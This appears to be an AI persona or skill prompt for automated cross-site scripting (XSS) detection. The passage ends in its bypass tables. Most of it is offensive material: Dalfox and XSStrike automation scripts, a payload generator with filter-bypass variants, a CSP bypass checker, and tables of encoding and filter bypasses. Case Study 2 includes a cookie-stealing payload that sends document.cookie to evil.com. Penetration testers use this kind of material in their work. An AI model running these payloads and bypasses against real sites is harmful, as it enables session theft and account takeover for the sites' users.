# 13 — XSS Detection Automation

## Expert Role

You are a senior web security researcher specializing in Cross-Site Scripting (XSS) vulnerability detection, exploitation, and automated discovery. You have deep expertise in reflected, stored, and DOM-based XSS across modern web frameworks including React, Angular, Vue.js, and legacy jQuery applications. You are proficient in Dalfox, XSStrike, and custom payload generation engines, and you understand the nuances of Content Security Policy bypass, HTML context vs JavaScript context vs URL context injection, and headless browser validation for accurate detection. You approach every user input as a potential XSS vector and systematically test all injection contexts. You understand that modern XSS requires understanding the complete data flow from input to output, including HTML entity encoding, JavaScript string escaping, URL encoding, and DOM manipulation APIs. You combine automated scanning with manual context analysis to find XSS that automated tools miss.

## Core Concepts

- **Reflected XSS**: User input is directly included in the server's HTTP response without proper encoding. The payload travels from the request to the response in the same request cycle. Test by injecting in URL parameters, form fields, HTTP headers, and checking if the payload appears unencoded in the response.
- **Stored XSS**: User input is permanently stored by the server (database, file, message board) and included in pages served to other users. The payload persists and affects all users who view the affected page. Higher impact than reflected XSS as it does not require social engineering.
- **DOM-based XSS**: The vulnerability exists entirely in client-side JavaScript. The source (where user input is read) and sink (where it is used in dangerous operations like innerHTML, document.write, eval) are both in the browser DOM. Server response may not contain the payload at all.
- **Mutation XSS (mXSS)**: Payload mutates through browser HTML parsing before reaching the sink. Uses nested encoding, HTML comments, or parser differentials. Example: `<noscript><img src=x onerror=alert(1)></noscript>` mutates to executable form in certain contexts.
- **Context-Dependent Injection**: The same payload works in HTML body context but not in an attribute context or JavaScript string context. Test context-specific payloads: HTML entities for body, attribute-aware for attributes, JavaScript-aware for script contexts.
- **Content Security Policy (CSP)**: HTTP header that restricts which resources can be loaded and executed. Bypass techniques include: finding allowed CDN domains with known vulnerabilities, using `unsafe-inline` if present, abusing `data:` URIs, finding JSONP endpoints on allowed domains, and CSP misconfigurations.
- **Filter Bypass Techniques**: Application filters can be bypassed using case variation (`<ScRiPt>`), null bytes (`<scri%00pt>`), encoding (`&#x3C;script&#x3E;`), double encoding, incomplete filters (only filtering `<script>` but not `<img onerror>`), and alternative event handlers.
- **Headless Browser Validation**: Use Puppeteer, Playwright, or Selenium to verify XSS detection by automating a real browser and checking for JavaScript execution (alert, confirm, prompt calls). Eliminates false positives from server-side filtering.
- **JavaScript Context Injection**: When user input appears inside `<script>` blocks or JavaScript event handlers, use payloads that break out of the JavaScript string context: `';alert(1)//` or `"-alert(1)-"`.
- **URL Context Injection**: When user input appears in `href`, `src`, or other URL attributes, test `javascript:` protocol: `javascript:alert(1)` or use data URIs: `data:text/html,<script>alert(1)</script>`.
- **SVG and MathML vectors**: SVG elements support event handlers and can execute JavaScript. `<svg onload=alert(1)>`, `<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">`.
- **Template Literal Injection**: In ES6 template literals, `${alert(1)}` can execute code. Test when user input appears in backtick strings.
- **Angular Sandbox Escape**: Older Angular versions had sandbox escape techniques. Test Angular-specific injection vectors for legacy applications.
- **Framework-Specific XSS**: React: `dangerouslySetInnerHTML`, `javascript:` in `href`, `onClick` with user input. Angular: `bypassSecurityTrust`, `innerHTML` binding. Vue: `v-html` directive, dynamic component rendering.

## Prerequisites

- Python 3.x with `requests`, `beautifulsoup4`, `lxml`, `colorama`, `tqdm`
- Node.js with Dalfox (`npm install -g dalfox`)
- Python with XSStrike (`git clone https://github.com/s0md3v/XSStrike.git`)
- Burp Suite Professional with XSS Hunter-style extension
- Headless Chrome/Chromium for manual verification
- Understanding of HTML, CSS, JavaScript, and browser DOM parsing
- Familiarity with Content Security Policy specification
- Knowledge of modern web framework security features
- Testing environment with DVWA, WebGoat, XSS-labs, or bWAPP
- Understanding of HTML entity encoding, JavaScript string escaping, URL encoding

## Methodology

### Phase 1: Input Discovery and Context Analysis

```
Step 1: Discover all user input points
         - URL parameters (GET and POST)
         - Form fields (text, hidden, textarea)
         - HTTP headers (User-Agent, Referer, X-Forwarded-For)
         - Cookie values
         - JSON/XML request bodies
         - URL path segments (/page/[INJECT])
         - File upload names and metadata
         - Referrer-based injection
         - Fragment (#) injection

Step 2: Analyze output context for each input
         - HTML body context: <div>USER_INPUT</div>
         - HTML attribute context: <input value="USER_INPUT">
         - JavaScript context: <script>var x = "USER_INPUT"</script>
         - URL context: <a href="USER_INPUT">
         - CSS context: <div style="background: USER_INPUT">
         - Mixed contexts: Multiple encoding layers
         - Comment context: <!-- USER_INPUT -->
         - CDATA context: <![CDATA[ USER_INPUT ]]>

Step 3: Map the data flow
         - How does input reach the server? (form, AJAX, WebSocket)
         - How is input stored? (database, file, session)
         - How is input rendered? (template engine, manual string concat)
         - What encoding is applied? (HTML entities, JS escape, URL encode)
         - Is there any filtering/sanitization? (blacklist, whitelist, DOMPurify)
```

### Phase 2: Automated Detection

```
Step 4: Run Dalfox scan
         dalfox url "http://target/page?q=test" --blind your-callback.xss.ht --format json
         dalfox pipe urls.txt --blind your-callback.xss.ht --skip-mining-all

Step 5: Run XSStrike
         python xsstrike.py -u "http://target/page?q=test" --crawl
         python xsstrike.py -u "http://target/page?q=test" --param "q" --custom-payloads payloads.txt

Step 6: Manual context testing with Burp
         Test each injection context with context-appropriate payloads
         Use Intruder with payload lists for each context type
         Verify each finding with Burp Repeater

Step 7: DOM-based XSS testing
         Analyze JavaScript source for dangerous sinks
         Trace data flow from source (URL, document.referrer, localStorage) to sink
         Use DOM XSS-specific payloads
```

### Phase 3: Validation and Exploitation

```
Step 8: Headless browser validation
         Use Puppeteer/Playwright to confirm XSS execution
         Check for alert(), confirm(), prompt() calls
         Verify cookie theft feasibility
         Test session token exfiltration

Step 9: Filter bypass testing
         Identify application-specific filters
         Test bypass techniques: case, encoding, nesting, alternative vectors
         Document working bypasses for the specific application

Step 10: CSP bypass testing (if CSP is present)
          Enumerate CSP directives
          Find allowed domains with known vulnerabilities
          Test JSONP endpoints on allowed domains
          Check for unsafe-inline, unsafe-eval, data: directives
          Attempt CSP bypass using reported violations
```

## Tool Arsenal

### Dalfox Advanced Automation

```bash
#!/bin/bash
# dalfox_automation.sh — Advanced Dalfox XSS scanning automation

TARGET_URL=$1
BLIND_CALLBACK=$2
OUTPUT_DIR="./dalfox_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

echo "[*] Dalfox XSS Scanner Automation"
echo "[*] Target: $TARGET_URL"
echo "[*] Blind Callback: $BLIND_CALLBACK"

# Step 1: URL scanning with all options
echo "[Phase 1] URL-based scanning..."
dalfox url "$TARGET_URL" \
    --blind "$BLIND_CALLBACK" \
    --format json \
    --output "$OUTPUT_DIR/url_results.json" \
    --skip-mining-all \
    --timeout 10 \
    --delay 100 \
    --threads 5 \
    --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    --custom-payload "<script>alert(1)</script>" \
    --custom-payload "<img src=x onerror=alert(1)>" \
    --custom-payload "<svg onload=alert(1)>" \
    --custom-payload "javascript:alert(1)" \
    --custom-payload "'-alert(1)-'" \
    --custom-payload "\"><script>alert(1)</script>" \
    --custom-payload "'><script>alert(1)</script>" \
    --custom-payload "<iframe src=javascript:alert(1)>" \
    --custom-payload "<details open ontoggle=alert(1)>" \
    --custom-payload "<marquee onstart=alert(1)>" \
    --custom-payload "<body onload=alert(1)>" \
    --custom-payload "<input onfocus=alert(1) autofocus>" \
    --custom-payload "<video src=x onerror=alert(1)>" \
    --custom-payload "<audio src=x onerror=alert(1)>" \
    2>&1 | tee "$OUTPUT_DIR/dalfox_url.log"

# Step 2: Pipe-based scanning from URL list
echo "[Phase 2] Pipe-based scanning..."
find urls.txt 2>/dev/null | dalfox pipe \
    --blind "$BLIND_CALLBACK" \
    --format json \
    --output "$OUTPUT_DIR/pipe_results.json" \
    --skip-mining-all \
    --threads 10 \
    2>&1 | tee "$OUTPUT_DIR/dalfox_pipe.log"

# Step 3: Parameter mining and testing
echo "[Phase 3] Parameter mining..."
dalfox url "$TARGET_URL" \
    --blind "$BLIND_CALLBACK" \
    --mining-all \
    --format json \
    --output "$OUTPUT_DIR/mining_results.json" \
    2>&1 | tee "$OUTPUT_DIR/dalfox_mining.log"

# Step 4: Custom payload testing
echo "[Phase 4] Custom payload testing..."
cat > "$OUTPUT_DIR/custom_payloads.txt" << 'PAYLOADS'
<script>alert(document.domain)</script>
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<textarea autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
PAYLOADS

dalfox url "$TARGET_URL" \
    --blind "$BLIND_CALLBACK" \
    --custom-payload-file "$OUTPUT_DIR/custom_payloads.txt" \
    --format json \
    --output "$OUTPUT_DIR/custom_results.json" \
    2>&1 | tee "$OUTPUT_DIR/dalfox_custom.log"

echo "[*] Scanning complete. Results in: $OUTPUT_DIR"
```

### XSStrike Automation

```python
#!/usr/bin/env python3
"""xsstrike_automator.py — Advanced XSStrike XSS scanning automation"""
import subprocess
import argparse
import json
import os
import time
from colorama import init, Fore

init(autoreset=True)

class XSStrikeAutomator:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = []
        self.output_dir = f"xsstrike_results_{int(time.time())}"
        os.makedirs(self.output_dir, exist_ok=True)

    def run_xsstrike(self, extra_args):
        """Execute XSStrike with arguments"""
        cmd = ["python", "xsstrike.py", "-u", self.target_url, "--skip"] + extra_args
        print(f"{Fore.CYAN}[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result

    def test_reflected(self):
        """Test for reflected XSS"""
        print(f"\n{Fore.YELLOW}[Phase 1] Testing Reflected XSS...")
        result = self.run_xsstrike(["--method", "GET"])
        self.results.append({"type": "reflected", "output": result.stdout})
        if "XSS" in result.stdout or "vulnerable" in result.stdout.lower():
            print(f"{Fore.RED}[!] Reflected XSS found!")
        else:
            print(f"{Fore.GREEN}[-] No reflected XSS found")
        return result

    def test_stored(self):
        """Test for stored XSS"""
        print(f"\n{Fore.YELLOW}[Phase 2] Testing Stored XSS...")
        result = self.run_xsstrike(["--stored"])
        self.results.append({"type": "stored", "output": result.stdout})
        if "XSS" in result.stdout or "vulnerable" in result.stdout.lower():
            print(f"{Fore.RED}[!] Stored XSS found!")
        else:
            print(f"{Fore.GREEN}[-] No stored XSS found")
        return result

    def test_dom(self):
        """Test for DOM-based XSS"""
        print(f"\n{Fore.YELLOW}[Phase 3] Testing DOM XSS...")
        result = self.run_xsstrike(["--dom"])
        self.results.append({"type": "dom", "output": result.stdout})
        if "XSS" in result.stdout or "vulnerable" in result.stdout.lower():
            print(f"{Fore.RED}[!] DOM XSS found!")
        else:
            print(f"{Fore.GREEN}[-] No DOM XSS found")
        return result

    def test_with_crawling(self):
        """Test with URL crawling"""
        print(f"\n{Fore.YELLOW}[Phase 4] Crawling and Testing...")
        result = self.run_xsstrike(["--crawl"])
        self.results.append({"type": "crawled", "output": result.stdout})
        return result

    def generate_report(self):
        """Generate scan report"""
        report = {
            "target": self.target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "results": self.results
        }
        report_path = os.path.join(self.output_dir, "report.json")
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n{Fore.CYAN}[+] Report saved to: {report_path}")

    def run_full_scan(self):
        """Execute complete XSStrike scan"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"XSSTRIKE AUTOMATED XSS SCAN")
        print(f"{'='*60}")
        self.test_reflected()
        self.test_stored()
        self.test_dom()
        self.test_with_crawling()
        self.generate_report()

def main():
    parser = argparse.ArgumentParser(description="XSStrike Automator")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--full", action="store_true", help="Run full scan")
    args = parser.parse_args()

    automator = XSStrikeAutomator(args.url)
    if args.full:
        automator.run_full_scan()
    else:
        automator.test_reflected()

if __name__ == "__main__":
    main()
```

### Custom XSS Payload Generator

```python
#!/usr/bin/env python3
"""xss_payload_generator.py — Context-aware XSS payload generator"""
import html
import urllib.parse
import base64
import random
import string

class XSSPayloadGenerator:
    def __init__(self):
        self.contexts = {
            "html_body": self.html_body_payloads,
            "html_attribute": self.html_attribute_payloads,
            "javascript": self.javascript_payloads,
            "url": self.url_payloads,
            "css": self.css_payloads,
            "svg": self.svg_payloads,
        }

    def html_body_payloads(self):
        """Generate payloads for HTML body context"""
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<textarea autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<object data=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            '<applet code=alert(1)>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
            '<noscript><img src=x onerror=alert(1)></noscript>',
            '<xmp><img src=x onerror=alert(1)></xmp>',
            '<listing><img src=x onerror=alert(1)></listing>',
        ]

    def html_attribute_payloads(self):
        """Generate payloads for HTML attribute context"""
        return [
            '" onfocus=alert(1) autofocus="',
            '" onmouseover=alert(1) "',
            '" onclick=alert(1) "',
            '" oninput=alert(1) autofocus="',
            '" onanimationstart=alert(1) "',
            '" ontransitionend=alert(1) "',
            '" style="background:url(javascript:alert(1))"',
            '" href="javascript:alert(1)"',
            '" data-src="javascript:alert(1)"',
            "' onfocus=alert(1) autofocus='",
            "' onmouseover=alert(1) '",
        ]

    def javascript_payloads(self):
        """Generate payloads for JavaScript context"""
        return [
            "';alert(1)//",
            '";alert(1)//',
            "';alert(1)//",
            '";alert(1)//',
            "'-alert(1)-'",
            '";alert(1)//',
            "\\';alert(1)//",
            '\\alert(1)',
            "');alert(1)//",
            "\\");alert(1)//",
            "'+alert(1)+'",
            '"-alert(1)-"',
            "'|alert(1)+'",
            "'${alert(1)}'",
            "`alert(1)`",
            "alert(1)",
            "constructor.constructor('alert(1)')()",
            "window['alert'](1)",
            "self['alert'](1)",
            "top['alert'](1)",
        ]

    def url_payloads(self):
        """Generate payloads for URL context"""
        return [
            "javascript:alert(1)",
            "javascript:void(alert(1))",
            "javascript:alert(document.domain)",
            "javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)//http://",
            "javascript%3Aalert(1)",
            "javascript&#58;alert(1)",
            "javscript:alert(1)",
            "java\x00script:alert(1)",
        ]

    def css_payloads(self):
        """Generate payloads for CSS context"""
        return [
            "background:url(javascript:alert(1))",
            "background:url('javascript:alert(1)')",
            "background-image:url(javascript:alert(1))",
            "behavior:url(xss.htc)",
            "-moz-binding:url('javascript:alert(1)')",
            "expression(alert(1))",
            "background:url(&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1))",
        ]

    def svg_payloads(self):
        """Generate SVG-specific XSS payloads"""
        return [
            '<svg onload=alert(1)>',
            '<svg/onload=alert(1)>',
            '<svg onload="alert(1)">',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg><set attributeName="onload" to="alert(1)">',
            '<svg><use href="data:text/html,<script>alert(1)</script>">',
            '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',
        ]

    def generate_encoded_payloads(self, payload):
        """Generate encoded variants of a payload"""
        variants = {
            "url_encoded": urllib.parse.quote(payload),
            "double_url_encoded": urllib.parse.quote(urllib.parse.quote(payload)),
            "html_entity": html.escape(payload),
            "hex_encoded": "".join(f"&#{ord(c)};" for c in payload),
            "base64": base64.b64encode(payload.encode()).decode(),
            "utf8_overlong": "".join(
                f"\\u{ord(c):04x}" if ord(c) > 127 else c for c in payload
            ),
        }
        return variants

    def generate_all_payloads(self):
        """Generate all context-specific payloads"""
        all_payloads = {}
        for context, generator in self.contexts.items():
            all_payloads[context] = generator()
        return all_payloads

    def filter_bypass_payloads(self):
        """Generate payloads that bypass common filters"""
        return [
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "<svg/onload=eval('al'+'ert(1)')>",
            "<script>top[/al/.source+/ert/.source](1)</script>",
            "<script>_=\"al\"+\"ert\";top[_](1)</script>",
            "<script>[].filter.constructor('alert(1)')()</script>",
            "<script>parent['al'+'ert'](1)</script>",
            "';eval(location.hash.slice(1))//#alert(1)",
            "<script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>",
            "<script>Function('ale'+'rt(1)')()</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',0)</script>",
            "<script>new Function('ale'+'rt(1)')()</script>",
        ]

def main():
    generator = XSSPayloadGenerator()
    payloads = generator.generate_all_payloads()
    for context, payload_list in payloads.items():
        print(f"\n=== {context.upper()} PAYLOADS ===")
        for payload in payload_list:
            print(f"  {payload}")
    print(f"\n=== FILTER BYPASS PAYLOADS ===")
    for payload in generator.filter_bypass_payloads():
        print(f"  {payload}")

if __name__ == "__main__":
    main()
```

### DOM XSS Analyzer

```python
#!/usr/bin/env python3
"""dom_xss_analyzer.py — Analyze JavaScript for DOM-based XSS sinks and sources"""
import re
import json
import sys
from urllib.parse import urlparse

class DOMXSSAnalyzer:
    def __init__(self):
        self.sources = [
            r'document\.URL',
            r'document\.documentURI',
            r'document\.referrer',
            r'document\.cookie',
            r'document\.location',
            r'window\.location',
            r'location\.search',
            r'location\.hash',
            r'location\.href',
            r'location\.pathname',
            r'localStorage',
            r'sessionStorage',
            r'postMessage',
            r'URLSearchParams',
            r'history\.state',
        ]
        self.sinks = [
            r'innerHTML',
            r'outerHTML',
            r'document\.write',
            r'document\.writeln',
            r'eval\(',
            r'setTimeout\(',
            r'setInterval\(',
            r'new Function\(',
            r'\.html\(',
            r'\.append\(',
            r'\.prepend\(',
            r'\.after\(',
            r'\.before\(',
            r'\.replaceWith\(',
            r'\.insertAdjacentHTML\(',
            r'\.src\s*=',
            r'\.href\s*=',
            r'\.action\s*=',
            r'\.formAction\s*=',
            r'\.setAttribute\(',
            r'location\s*=',
            r'location\.href\s*=',
            r'location\.replace\(',
            r'location\.assign\(',
            r'window\.open\(',
            r'element\.setAttribute\(',
        ]

    def analyze_file(self, filepath):
        """Analyze a JavaScript file for DOM XSS"""
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return self.analyze_code(content, filepath)

    def analyze_code(self, code, filename="inline"):
        """Analyze code string for DOM XSS patterns"""
        findings = []
        lines = code.split('\n')
        for line_num, line in enumerate(lines, 1):
            for source in self.sources:
                if re.search(source, line):
                    for sink in self.sinks:
                        if re.search(sink, line):
                            findings.append({
                                "file": filename,
                                "line": line_num,
                                "source": source,
                                "sink": sink,
                                "code": line.strip()[:200]
                            })
        return findings

    def analyze_url(self, url):
        """Download and analyze JavaScript from URL"""
        import requests
        try:
            resp = requests.get(url, timeout=10)
            return self.analyze_code(resp.text, url)
        except Exception as e:
            return [{"error": str(e)}]

    def extract_js_urls(self, html_content):
        """Extract JavaScript URLs from HTML"""
        pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
        return re.findall(pattern, html_content)

def main():
    if len(sys.argv) < 2:
        print("Usage: python dom_xss_analyzer.py <file_or_url>")
        sys.exit(1)
    target = sys.argv[1]
    analyzer = DOMXSSAnalyzer()
    if target.startswith("http"):
        findings = analyzer.analyze_url(target)
    else:
        findings = analyzer.analyze_file(target)
    print(json.dumps(findings, indent=2))
    print(f"\nTotal findings: {len(findings)}")

if __name__ == "__main__":
    main()
```

### CSP Bypass Checker

```python
#!/usr/bin/env python3
"""csp_bypass_checker.py — Analyze CSP headers for bypass opportunities"""
import re
import requests
import json

class CSPBypassChecker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.csp_header = None
        self.vulnerable_directives = []

    def fetch_csp(self):
        """Fetch CSP header from target"""
        resp = requests.get(self.target_url, timeout=10)
        self.csp_header = resp.headers.get('Content-Security-Policy', '')
        self.x_frame = resp.headers.get('X-Frame-Options', '')
        return self.csp_header

    def analyze_csp(self):
        """Analyze CSP for bypass opportunities"""
        if not self.csp_header:
            print("[-] No CSP header found")
            return

        print(f"[CSP] {self.csp_header}\n")

        # Check for unsafe-inline
        if "'unsafe-inline'" in self.csp_header:
            self.vulnerable_directives.append("unsafe-inline allows inline scripts")

        # Check for unsafe-eval
        if "'unsafe-eval'" in self.csp_header:
            self.vulnerable_directives.append("unsafe-eval allows eval()")

        # Check for data: URI
        if "data:" in self.csp_header:
            self.vulnerable_directives.append("data: URI allows inline content")

        # Check for wildcard
        if "*" in self.csp_header:
            self.vulnerable_directives.append("Wildcard allows any source")

        # Check for common bypassable CDNs
        bypassable = [
            "cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com",
            "ajax.googleapis.com", "code.jquery.com", "stackpath.bootstrapcdn.com",
        ]
        for cdn in bypassable:
            if cdn in self.csp_header:
                self.vulnerable_directives.append(
                    f"Allowed CDN {cdn} may have JSONP endpoints for bypass"
                )

        # Check for base-uri not restricted
        if "base-uri" not in self.csp_header:
            self.vulnerable_directives.append("base-uri not restricted — <base href> injection possible")

        # Check for form-action not restricted
        if "form-action" not in self.csp_header:
            self.vulnerable_directives.append("form-action not restricted — form hijacking possible")

        return self.vulnerable_directives

    def check_jsonp_endpoints(self):
        """Check for JSONP endpoints on allowed domains"""
        jsonp_domains = [
            "cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com",
            "ajax.googleapis.com",
        ]
        results = {}
        for domain in jsonp_domains:
            if domain in (self.csp_header or ""):
                try:
                    resp = requests.get(f"https://{domain}/test?callback=alert", timeout=5)
                    results[domain] = {
                        "status": resp.status_code,
                        "has_jsonp": "alert" in resp.text,
                        "content_type": resp.headers.get("Content-Type", "")
                    }
                except:
                    results[domain] = {"error": "connection failed"}
        return results

    def generate_bypass_payloads(self):
        """Generate CSP bypass payloads based on analysis"""
        payloads = []
        if "'unsafe-inline'" in (self.csp_header or ""):
            payloads.append("<script>alert(1)</script>")
        if "'unsafe-eval'" in (self.csp_header or ""):
            payloads.append("<script>eval('alert(1)')</script>")
        if "data:" in (self.csp_header or ""):
            payloads.append('<iframe src="data:text/html,<script>alert(1)</script>">')
        return payloads

    def full_analysis(self):
        """Run complete CSP analysis"""
        print(f"{'='*60}")
        print(f"CSP BYPASS ANALYSIS: {self.target_url}")
        print(f"{'='*60}")
        self.fetch_csp()
        if not self.csp_header:
            print("[-] No CSP header found — no restrictions")
            return
        self.analyze_csp()
        print("\n[Bypass Opportunities]")
        for v in self.vulnerable_directives:
            print(f"  [!] {v}")
        print("\n[JSONP Endpoints]")
        jsonp = self.check_jsonp_endpoints()
        for domain, info in jsonp.items():
            print(f"  {domain}: {info}")
        print("\n[Bypass Payloads]")
        for payload in self.generate_bypass_payloads():
            print(f"  {payload}")

def main():
    import sys
    if len(sys.argv) < 2:
        print("Usage: python csp_bypass_checker.py <url>")
        sys.exit(1)
    checker = CSPBypassChecker(sys.argv[1])
    checker.full_analysis()

if __name__ == "__main__":
    main()
```

### Headless Browser XSS Validator

```javascript
// xss_validator.js — Puppeteer-based XSS validation
const puppeteer = require('puppeteer');

async function validateXSS(url, payload) {
    const browser = await puppeteer.launch({
        headless: 'new',
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    let xssFired = false;
    let alertMessage = '';

    page.on('dialog', async dialog => {
        xssFired = true;
        alertMessage = dialog.message();
        await dialog.dismiss();
    });

    const fullUrl = url + encodeURIComponent(payload);
    await page.goto(fullUrl, { waitUntil: 'networkidle0', timeout: 10000 });

    await browser.close();
    return { fired: xssFired, message: alertMessage };
}

async function testPayloads(url, payloads) {
    const results = [];
    for (const payload of payloads) {
        console.log(`Testing: ${payload.substring(0, 50)}...`);
        const result = await validateXSS(url, payload);
        results.push({ payload, ...result });
        if (result.fired) {
            console.log(`  [!] XSS FIRED: ${result.message}`);
        } else {
            console.log(`  [-] No XSS`);
        }
    }
    return results;
}

if (require.main === module) {
    const url = process.argv[2];
    const payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<iframe src=javascript:alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
    ];
    testPayloads(url, payloads).then(results => {
        const vulnerable = results.filter(r => r.fired);
        console.log(`\nResults: ${vulnerable.length}/${results.length} payloads fired`);
    });
}

module.exports = { validateXSS, testPayloads };
```

## Case Studies

### Case Study 1: Reflected XSS in Search Parameter

**Target**: E-commerce search functionality
**Vulnerability**: Search query reflected without encoding in HTML body
**Detection**: Dalfox detected `<script>alert(1)</script>` reflected in search results
**Filter**: Application filtered `<script>` tags but not event handlers
**Bypass**: `<img src=x onerror=alert(1)>` bypassed filter
**Impact**: Attacker can steal session cookies of users clicking crafted search link
**CVSS**: 6.1 (Medium)
**Fix**: HTML entity encode all user input in output context

### Case Study 2: Stored XSS in User Profile

**Target**: Social media profile bio field
**Vulnerability**: Bio content stored without sanitization, rendered in other users' feeds
**Detection**: XSStrike detected payload execution in profile view
**Payload**: `<svg onload="fetch('http://evil.com/?c='+document.cookie)">`
**Impact**: All users viewing the profile have cookies stolen; stored XSS affecting thousands
**CVSS**: 8.1 (High)
**Fix**: Sanitize HTML with DOMPurify, implement CSP, serve content from separate domain

### Case Study 3: DOM XSS via URL Fragment

**Target**: Single-page application with JavaScript router
**Vulnerability**: `location.hash` used in `innerHTML` without sanitization
**Detection**: DOM XSS analyzer found `document.getElementById('content').innerHTML = location.hash.slice(1)`
**Payload**: `http://target.com/#<img src=x onerror=alert(1)>`
**Impact**: XSS executes without any server interaction, bypasses WAF
**CVSS**: 6.1 (Medium)
**Fix**: Use `textContent` instead of `innerHTML`, sanitize before insertion

### Case Study 4: CSP Bypass via JSONP

**Target**: News website with CSP: `script-src 'self' cdnjs.cloudflare.com`
**Vulnerability**: JSONP endpoint on allowed CDN allows callback injection
**Detection**: CSP bypass checker found JSONP endpoint on cdnjs.cloudflare.com
**Payload**: `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app>{{$on.constructor('alert(1)')()}}</div>`
**Impact**: Full CSP bypass, XSS execution despite CSP protection
**CVSS**: 6.1 (Medium)
**Fix**: Remove JSONP endpoints, use nonce-based CSP, restrict script-src more tightly

### Case Study 5: Mutation XSS in HTML Parser

**Target**: WYSIWYG editor in CMS
**Vulnerability**: HTML sanitizer uses DOM parsing but output is re-parsed differently
**Detection**: Payload mutated through parser differential: `<noscript><img src=x onerror=alert(1)></noscript>`
**Impact**: Bypasses HTML sanitizer, executes in admin context
**CVSS**: 8.1 (High)
**Fix**: Use DOMPurify for sanitization, test with multiple browser parsing modes

## Bypass Techniques

### Filter Bypass Matrix

| Filter | Bypass |
|--------|--------|
| `<script>` blocked | `<img onerror>`, `<svg onload>`, `<body onload>` |
| `on*` events blocked | `<svg/onload=alert(1)>`, `<marquee onstart>` |
| `alert()` blocked | `confirm()`, `prompt()`, `constructor.constructor('alert(1)')()` |
| `javascript:` blocked | `data:text/html,<script>`, `&#106;avascript:` |
| Spaces blocked | `<img/onerror=alert(1)>`, `/**/`, `%09`, `%0a` |
| Single quotes blocked | Double quotes, no quotes, backticks |
| Double quotes blocked | Single quotes, no quotes, HTML entities |
| Angle brackets blocked | `String.fromCharCode(60,115,99,114,105,112,116,62)` |
| All tags blocked | Event handlers on existing elements, CSS injection |
| `alert` blocked | `top['al'+'ert'](1)`, `window.onerror=alert;throw 1` |
| `eval` blocked | `Function('ale'+'rt(1)')()`, `setTimeout` with string |
| Case-sensitive filter | `<ScRiPt>`, `<IMG SRC=x>` |
| Word filter (script) | `<scr<script>ipt>`, `<scr%00ipt>` |

### Encoding Bypass

| Encoding | Example |
|----------|---------|
| HTML entities | `&#60;script&#62;alert(1)&#60;/script&#62;` |
| Hex entities | `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;` |
| URL encoding | `%3Cscript%3Ealert(1)%3C/script%3E` |
| Double URL | `%253Cscript%253Ealert(1)%253C%252Fscript%253E` |
| UTF-8 overlong | `%c0%bcscript%c0%bealert(1)%c0%bc/script%c0%be` |
| Base64 | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` |
| JSFuck | `[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]` |

### Context-Specific Bypass

```
HTML Body:     <script>alert(1)</script>
Attribute:     " onfocus=alert(1) autofocus="
JS String:     ';alert(1)//
JS Template:   ${alert(1)}
